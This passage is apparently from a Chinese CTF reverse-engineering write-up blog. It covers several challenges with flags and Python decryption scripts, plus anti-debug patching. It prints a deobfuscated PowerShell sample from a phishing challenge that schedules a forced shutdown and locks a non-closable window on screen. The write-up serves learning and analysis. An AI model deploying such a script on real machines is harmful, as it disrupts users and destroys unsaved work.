class="hljs-string">&quot;<span class="hljs-variable">$o</span>&quot;</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125;) &quot;</span>[<span class="hljs-variable">$o</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$r</span>&quot;</span>[<span class="hljs-string">&quot;<span class="hljs-variable">$q</span>&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$e</span>&quot;</span> ] &#125; ) ; <span class="hljs-string">&quot; <span class="hljs-variable">$r</span> (<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>......</span><br></code></pre></td></tr></table></figure><p>这一串就是加密的过程，<code>$r</code> 是核心变量。</p><p>最终结果</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$DebugPreference</span> = <span class="hljs-variable">$ErrorActionPreference</span> = <span class="hljs-variable">$VerbosePreference</span> = <span class="hljs-variable">$WarningPreference</span> = <span class="hljs-string">&quot;SilentlyContinue&quot;</span><br><br>[<span class="hljs-built_in">void</span>] [<span class="hljs-type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="hljs-string">&quot;System.Windows.Forms&quot;</span>)<br>[<span class="hljs-built_in">void</span>] [<span class="hljs-type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="hljs-string">&quot;System.Drawing&quot;</span>)<br><br>shutdown /s /t <span class="hljs-number">600</span> &gt;<span class="hljs-variable">$Null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-variable">$Form</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Form<br><span class="hljs-variable">$Form</span>.Text = <span class="hljs-string">&quot;Ciallo～(∠·ω&lt; )⌒★&quot;</span><br><span class="hljs-variable">$Form</span>.StartPosition = <span class="hljs-string">&quot;Manual&quot;</span><br><span class="hljs-variable">$Form</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">40</span>, <span class="hljs-number">40</span>)<br><span class="hljs-variable">$Form</span>.Size = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.MinimalSize = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.MaximalSize = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.FormBorderStyle = <span class="hljs-string">&quot;FixedDialog&quot;</span><br><span class="hljs-variable">$Form</span>.BackColor = <span class="hljs-string">&quot;#0077CC&quot;</span><br><span class="hljs-variable">$Form</span>.MaximizeBox = <span class="hljs-variable">$False</span><br><span class="hljs-variable">$Form</span>.TopMost = <span class="hljs-variable">$True</span><br><br><br><span class="hljs-variable">$fF1IA49G</span> = <span class="hljs-string">&quot;LILCTF&#123;be_vigilant_against_phishing&#125;&quot;</span><br><span class="hljs-variable">$fF1IA49G</span> = <span class="hljs-string">&quot;N0pe&quot;</span><br><br><br><span class="hljs-variable">$Label1</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label1</span>.Text = <span class="hljs-string">&quot;:)&quot;</span><br><span class="hljs-variable">$Label1</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">80</span>)<br><span class="hljs-variable">$Label1</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label1</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label1</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;Consolas&quot;</span>, <span class="hljs-number">64</span>)<br><br><span class="hljs-variable">$Label2</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label2</span>.Text = <span class="hljs-string">&quot;这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里&quot;</span><br><span class="hljs-variable">$Label2</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">240</span>)<br><span class="hljs-variable">$Label2</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label2</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label2</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;微软雅黑&quot;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-variable">$Label3</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label3</span>.Text = <span class="hljs-string">&quot;你的电脑将在 10 分钟后关机，请保存你的工作&quot;</span><br><span class="hljs-variable">$Label3</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">300</span>)<br><span class="hljs-variable">$Label3</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label3</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label3</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;微软雅黑&quot;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-variable">$Form</span>.Controls.AddRange(<span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$Label1</span>, <span class="hljs-variable">$Label2</span>, <span class="hljs-variable">$Label3</span>))<br><br><span class="hljs-variable">$Form</span>.Add_Shown(&#123;<span class="hljs-variable">$Form</span>.Activate()&#125;)<br><span class="hljs-variable">$Form</span>.Add_FormClosing(&#123;<br>    <span class="hljs-variable">$_</span>.Cancel = <span class="hljs-variable">$True</span><br>    [<span class="hljs-type">System.Windows.Forms.MessageBox</span>]::Show(<span class="hljs-string">&quot;不允许关闭！&quot;</span>, <span class="hljs-string">&quot;提示&quot;</span>, [<span class="hljs-type">System.Windows.Forms.MessageBoxButtons</span>]::OK, [<span class="hljs-type">System.Windows.Forms.MessageBoxIcon</span>]::Information)<br>&#125;)<br><br><span class="hljs-variable">$Form</span>.ShowDialog() | <span class="hljs-built_in">Out-Null</span><br></code></pre></td></tr></table></figure><p>LILCTF{be_vigilant_against_phishing}</p><h2 id="Qt-Creator"><a href="#Qt-Creator" class="headerlink" title="Qt_Creator"></a>Qt_Creator</h2><p>题目给的是一个安装包，下载下来后直接安装文件，就是一个登录的页面，要求输入注册码，注册码就是flag，所以解题的思路就是通过分析安装得到的文件得到注册码</p><p>整体来说这个题目难度不大，但是需要一步步动调来确定输入函数的位置</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206409.png" alt="image-20250820005109524"></p><p>安装好的demo_code_editor.exe打开拖入ida</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200048966.png" alt="image-20250820004857888"></p><p>我们直接进入ida时看到的主函数入口是winmain，也可以从那里开始进行调试，这道题就是动调找主要函数的过程。</p><p>如果没有什么思路，我们就可以直接从start函数这里开始调试</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207769.png" alt="image-20250820004740860"></p><p>进入sub_401150函数，我们可以利用动调或者直接分析函数内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206400.png" alt="image-20250820005827378"></p><p>sub_417C00就是入口函数，点进去也能看到这个窗口程序的主函数winmain</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200101149.png" alt="image-20250820010117080"></p><p>可以在函数开头下断点，然后f8一步步动调</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200103384.png" alt="image-20250820010341303"></p><p>发现在sub_4015E0函数处就直接退出了，说明有反调试</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207412.png" alt="image-20250820010432571"></p><p>可以在反调试的跳转函数那里下断点，在动调的时候改zf，或者直接将jz改为jmp（74改为EB）</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206270.png" alt="image-20250820010446802"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207226.png" alt="image-20250820010938002"></p><p>顺便把exit退出函数给nop掉，然后patch保存，这样就顺利地反反调试了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206365.png" alt="image-20250820011418960"></p><p>继续调试，发现程序在运行到sub_403400函数的时候跳出让用户输入注册码，随便输入之后发现程序就直接退出了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207332.png" alt="image-20250820011626032"></p><p>重新调试，在sub_403400函数下断点然后f7进去一步步调试，发现在QDialog::exec这里让用户输入</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200141258.png" alt="image-20250820011955496"></p><p>重新调试，进入QDialog::exec函数一步步调试<img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200136669.png" alt="image-20250820013636591"></p><p>在调试的过程中也可以发现QDialog::exec函数其实是一个窗口生成和输入的函数，在这里的调试过程中随便输入验证不会跳出exit，说明我们没有触碰到exit，也说明我们快接近验证字符串的函数部分了。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200143267.png" alt="image-20250820014308177"></p><p>继续动调，一直到最后看到的退出exit函数，这里没什么技巧，一直f8</p><p>直接跟踪这个函数，于是发现了sub_410100函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207773.png" alt="image-20250820013052924"></p><p>发现这里的QLineEdit::text() → 得到输入的字符串（Qt 的QString），这个函数就是用来验证输入的字符串的，我们成功找到了真正的flag存在的位置，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207376.png" alt="image-20250820013233998"></p><p>在 QLineEdit::text(*(a1[6] + 20));下断点重新调试</p><p>然后再次在QDialog::exec函数输入注册码之后就会跳转到sub_410100，然后再返回看a1的内容，就能得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200155829.png" alt="image-20250820015506728"></p><p>LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}</p><h2 id="obfusheader-h"><a href="#obfusheader-h" class="headerlink" title="obfusheader.h"></a><strong>obfusheader.h</strong></h2><p>这题本来想去除花指令，就是一个jz跳转的花指令，但是有点多，就没有去除，好在汇编不太难，可以直接看出加密逻辑</p><p>可以通过搜索字符串找到关键函数的位置，也可以在初始函数这里找到（做过好多道题，一般都会在start函数里的code处是主函数入口）</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272236627.png" alt="image-20250827223612464"></p><p>在输入flag这里下断点</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272236128.png" alt="image-20250827223629947"></p><p>这里如果输入的字符串长度不对就会直接退出，可以通过调试发现寄存器rax为0x28，长度为40，然后输入之后下硬件断点</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272239519.png" alt="image-20250827223926343"></p><p>第一次调试直接按f9，到这里，这里就是一个比较长度的函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272203539.png" alt="image-20250827220320351"></p><p>这里两次调试是与一个随机数异或</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272203463.png" alt="image-20250827220338332"></p><p>将xor结束后的测试密文提取出来得到随机数xor的key</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272229434.png" alt="image-20250827222911255"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key</span>[]=&#123;<span class="hljs-number">0</span>x76,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>x47,<span class="hljs-number">0</span>xf8,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>xa7,<span class="hljs-number">0</span>x43,<span class="hljs-number">0</span>xc8,<span class="hljs-number">0</span>x33,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x67,<span class="hljs-number">0</span>xd4,<span class="hljs-number">0</span>x69,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x61,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>xa5,<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>x13,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>xa9,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>xf9,<span class="hljs-number">0</span>x21,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x5c,<span class="hljs-number">0</span>x76,<span class="hljs-number">0</span>x17,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>xfd,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x33&#125;<br></code></pre></td></tr></table></figure><p>第四次调试，我没有去除花指令，但也不太影响看汇编，这里就是位运算，将高四位和低四位调换位置</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272250249.png"></p><p>第五次调试，这里就是按位取反</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272251990.png" alt="image-20250827225146843"></p><p>第六次到这里，cmp比较指令，可以得到密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272245175.png" alt="image-20250827224524025"></p><p>提取出的密文：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">enc</span>[]=&#123;<span class="hljs-number">0</span>x5C,<span class="hljs-number">0</span>xAF,<span class="hljs-number">0</span>xB0,<span class="hljs-number">0</span>x1C,<span class="hljs-number">0</span>xFC,<span class="hljs-number">0</span>xEF,<span class="hljs-number">0</span>xC7,<span class="hljs-number">0</span>x8D,<span class="hljs-number">0</span>x1,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x36,<span class="hljs-number">0</span>x39,<span class="hljs-number">0</span>x11,<span class="hljs-number">0</span>xBE,<span class="hljs-number">0</span>x47,<span class="hljs-number">0</span>x2F,<span class="hljs-number">0</span>x5B,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xFD,<span class="hljs-number">0</span>xFA,<span class="hljs-number">0</span>x2D,<span class="hljs-number">0</span>xF8,<span class="hljs-number">0</span>xD0,<span class="hljs-number">0</span>xFA,<span class="hljs-number">0</span>xFA,<span class="hljs-number">0</span>x3F,<span class="hljs-number">0</span>x81,<span class="hljs-number">0</span>xFD,<span class="hljs-number">0</span>xA6,<span class="hljs-number">0</span>x9E,<span class="hljs-number">0</span>x6,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>xCE,<span class="hljs-number">0</span>x7B,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>xBE,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>xBB,<span class="hljs-number">0</span>xDF,<span class="hljs-number">0</span>x1B&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x43</span>,<br>       <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x61</span>,<br>       <span class="hljs-number">0x64</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x21</span>,<br>       <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x33</span>]<br><br>enc = [<span class="hljs-number">0x5C</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x88</span>,<br>       <span class="hljs-number">0x36</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFA</span>,<br>       <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x9E</span>,<br>       <span class="hljs-number">0x06</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x1B</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">swap_high_low4</span>(<span class="hljs-params">byte</span>):<br>    high_4 = byte &gt;&gt; <span class="hljs-number">4</span><br>    low_4 = byte &amp; <span class="hljs-number">0x0F</span><br>    <span class="hljs-keyword">return</span> (low_4 &lt;&lt; <span class="hljs-number">4</span>) | high_4<br><br>plaintext_bytes = []<br><span class="hljs-keyword">for</span> e_byte, k_byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(enc, key):<br>    not_e = e_byte ^ <span class="hljs-number">0xFF</span><br>    swapped = swap_high_low4(not_e)<br>    plain_byte = swapped ^ k_byte<br>    plaintext_bytes.append(plain_byte)<br><br>plaintext = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> plaintext_bytes])<br><span class="hljs-built_in">print</span>(plaintext)<br></code></pre></td></tr></table></figure><p>LILCTF{wH4T_is_d47a1I0W_CAN_l7_6e_eaTEN}</p><h2 id="Oh-My-Uboot"><a href="#Oh-My-Uboot" class="headerlink" title="Oh_My_Uboot"></a><strong>Oh_My_Uboot</strong></h2><p>看官方的wp利用qemu进行调试来着，这个方法我还没试，可能出题人忘记隐藏字符串了~</p><p>可以通过搜索字符串直接找到关键密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508280109207.png" alt="image-20250828010908027"></p><p>然后交叉引用找到主函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508280110775.png" alt="image-20250828011057625"></p><p>unk_6086D357数据会被sub_60813F74解密，这部分应该输出类似英文提示信息</p><p>核心校验函数 <code>sub_60813E3C</code>，生成自定义的base58表</p><p>生成的表是</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[<span class="hljs-string">\]^_`abcdefghi</span><br></code></pre></td></tr></table></figure><p>最后不要忘记xor 72！！</p><p>完整脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">alphabet = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>, <span class="hljs-number">0x30</span>+<span class="hljs-number">58</span>))<br>decode_map = &#123;c: i <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(alphabet)&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_base58_decode</span>(<span class="hljs-params">s</span>):<br>    num = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s:<br>        num = num * <span class="hljs-number">58</span> + decode_map[ch]<br>    out = []<br>    <span class="hljs-keyword">while</span> num &gt; <span class="hljs-number">0</span>:<br>        out.append(num &amp; <span class="hljs-number">0xFF</span>)<br>        num &gt;&gt;= <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">reversed</span>(out))<br><br>cipher = <span class="hljs-string">&quot;5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;&quot;</span><br>decoded = custom_base58_decode(cipher)<br><br>plain = <span class="hljs-built_in">bytes</span>(b ^ <span class="hljs-number">0x72</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> decoded)<br><span class="hljs-built_in">print</span>(plain)<br><br></code></pre></td></tr></table></figure><p>LILCTF{Ub007_1s_v3ry_ez}</p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF-4th</title>
    <link href="/2025/08/26/NSSCTF-4th/"/>
    <url>/2025/08/26/NSSCTF-4th/</url>
    
    <content type="html"><![CDATA[<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="checkit"><a href="#checkit" class="headerlink" title="checkit"></a>checkit</h2><p>先用jadx看，关键逻辑在native层的so文件</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242908.png" alt="img"></p><p> 反编译<code>libcheck.so</code>文件，在Java_com_test_ezre_MainActivity_checkInput函数发现了主要函数实现exec</p><p>点进去看发现是vm的实现</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242522.png" alt="img"></p><p>主要逻辑</p><p> <code>code</code> 在 7→45 这一段每轮处理 两个字符 并把变换结果依次 <code>PUSH</code> 到栈里；然后 50→52 跳到比较循环，按从后到前 <code>POP</code> 出这 50 个值，逐个与 <code>cmp_data[i]</code> 比较，最终输出 “oh!You are right!”.</p><p>对第 <code>i</code> 个字符（从 0 开始）：</p><ul><li>偶数位：<code>v = 0x53 ^ (x - 5)</code> ⇒ 反推 <code>x = (v ^ 0x53) + 5</code></li><li>奇数位：<code>v = (x ^ 0x43) + 14</code> ⇒ 反推 <code>x = (v - 14) ^ 0x43</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">CMP_DATA = [<br>    <span class="hljs-number">0x1A</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x1D</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x1C</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x3F</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x3D</span>,<br>    <span class="hljs-number">0x0F</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x3A</span>,<span class="hljs-number">0x3A</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x1A</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x3D</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x3C</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x82</span>,<br>    <span class="hljs-number">0x39</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x43</span>,<span 